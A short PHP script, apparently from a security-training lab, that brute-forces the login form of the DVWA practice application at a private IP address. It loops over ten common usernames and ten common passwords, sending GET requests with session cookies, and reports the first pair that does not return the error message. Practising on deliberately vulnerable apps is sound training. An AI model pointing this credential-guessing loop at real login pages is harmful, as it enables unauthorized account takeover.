<?php

    //function that send a GET request to a url with parameters
    function get_request($url, $params,$security = false,$session= false) {
        $query = http_build_query ($params);
        $url = $url . "?" . $query;
        
        $ch = curl_init();
        
        //set cookies php session and security
        curl_setopt($ch, CURLOPT_COOKIE, "security=$security; PHPSESSID=$session");
        
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $content = curl_exec($ch);
        $header = curl_getinfo($ch);
        curl_close($ch);


        return array($header, $content);
    }

    //list of 10 most common usernames
    $users = [
        "admin",
        "user",
        "test",
        "guest",
        "info",
        "adm",
        "mysql",
        "user1",
        "administrator",
        "root"
    ];

    //list of 10 most common passwords
    $passwords = [
        "123456",
        "123456789",
        "qwerty",
        "password",
        "1234567",
        "12345678",
        "12345",
        "iloveyou",
        "111111",
        "123123"
    ];

    function TryPasswordAndUserPair($users,$passwords,$security,$session){
        $url = "http://192.168.56.101/dvwa/vulnerabilities/brute/";

        $verification = "<pre><br>Username and/or password incorrect.</pre>";

        foreach($users as $user){
            foreach($passwords as $password){
                $data = array(
                    "username" => $user,
                    "password" => $password,
                    "Login" => "Login"
                );
                list($header, $content) = get_request($url, $data,$security,$session);
                
                if(strpos($content, $verification) === false){
                    echo "Found user: $user and password: $password";
                    return true;
                }
            }
        }
        return false;
    }

    $data = array(
        "username" => "admin",
        "password" => "password",
        "Login" => "Login"
    );

    if(!TryPasswordAndUserPair($users,$passwords,"low","YOUR_PHP_SESSION_ID")){
        echo "No user and password found";
    }
?>
